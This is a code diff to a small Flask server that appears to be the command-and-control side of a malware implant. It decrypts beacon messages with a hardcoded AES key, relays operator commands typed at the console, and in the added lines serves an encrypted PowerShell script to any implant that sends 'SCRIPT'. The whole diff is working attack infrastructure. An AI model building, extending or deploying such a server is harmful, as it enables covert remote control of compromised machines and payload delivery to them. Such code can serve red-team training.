@@ -12,15 +12,6 @@ KEY = b"A"*16
 IV = b"A"*16
 cipher = AES.new(KEY, AES.MODE_CBC, iv=IV)
 
-# Strips padding if there is any (PKCS #7 padding scheme)
-def strip_padding(decrypted: str):
-    char = decrypted[-1]
-    padded = all([b == char for b in decrypted[-char:]])
-    if padded:
-        return decrypted[0:-char]
-    return decrypted
-
-
 
 @app.route('/post', methods=['POST'])
 def handle_post():
@@ -41,6 +32,15 @@ def handle_post():
         # print("Decrypted         : ", decrypted)
         print("Message           : ", message.decode("utf8"))
 
+        # Implant requested powershell script
+        if message == b"SCRIPT":
+            fd = open("script.ps1", "rb")
+            script = fd.read()
+            fd.close()
+            script_enc = cipher_enc.encrypt(pad(script, 16))
+            return b64encode(script_enc)
+
+
         # Get user input.
         # We loop here to prevent us from trying to send blank messages
         user_input = b""
@@ -56,6 +56,7 @@ def handle_post():
         return response
     else:
         return "INVALID HTTP METHOD - ONLY POST ALLOWED"
+
 
 if __name__ == '__main__':
     app.run(debug=True, port=80, host="0.0.0.0")
